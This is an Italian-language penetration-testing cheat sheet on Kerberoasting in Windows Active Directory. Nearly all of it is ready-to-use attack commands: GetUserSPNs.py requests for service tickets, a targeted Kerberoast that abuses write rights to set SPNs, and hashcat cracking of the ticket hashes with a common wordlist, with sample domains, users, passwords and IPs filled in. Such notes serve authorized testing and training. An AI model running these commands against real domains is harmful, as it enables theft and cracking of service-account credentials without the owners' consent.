# Kerberoasting (Windows)

| Caratteristica | Dettaglio |
| :--- | :--- |
| **Tool necessari** | `Impacket (GetUserSPNs.py)`, `Rubeus`, `Hashcat`, `NetExec` |
| **SO Target** | Windows (Active Directory) |
| **Quando effettuare** | Se un utente ha un Service Principal Name (SPN) registrato |
| **Info Utili** | Richiesta di ticket TGS per cracking offline delle password |

### Funzionamento
Permette di richiedere il ticket di servizio (TGS) per qualsiasi account che abbia un Service Principal Name (SPN) registrato in Active Directory.

### Estrazione Ticket (Linux)
Utilizzando Impacket da una macchina esterna al dominio.

**Comando Generico:**
```bash
GetUserSPNs.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request
```
*Esempio:*
```bash
GetUserSPNs.py eh.local/svc-db:L3gac1P4ss -dc-ip 10.10.10.117 -request
```

### Targeted Kerberoast
Se controlli un utente con privilegi per settare SPN (es. GenericWrite), puoi attivarlo su un utente target e poi kerberoastarlo.

**Comando Generico:**
```bash
python3 targetedKerberoast.py -v -d <DOMAIN> -u <USER> -p <PASSWORD> --dc-ip <DC_IP>
```
*Esempio:*
```bash
python3 targetedKerberoast.py -v -d eh.local -u morgan.kane -p 'Pass123' --dc-ip 10.10.10.180
```

### Cracking offline (Hashcat)
Il formato del ticket è solitamente `$krb5tgs$23`.

**Comando Generico:**
```bash
hashcat -m 13100 <HASH_FILE> <PATH_TO_WORDLIST>
```
*Esempio:*
```bash
hashcat -m 13100 svc-app.hash /usr/share/wordlists/rockyou.txt
```

### URL Fondamentali
- [Tarlogic - Kerberos Attack](https://www.tarlogic.com/cybersecurity-glossary/kerberos/)
- [The Hacker Recipes - Kerberoasting](https://www.thehacker.recipes/ad/movement/kerberos/kerberoasting)
- [ShutdownRepo - Targeted Kerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Hashcat Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
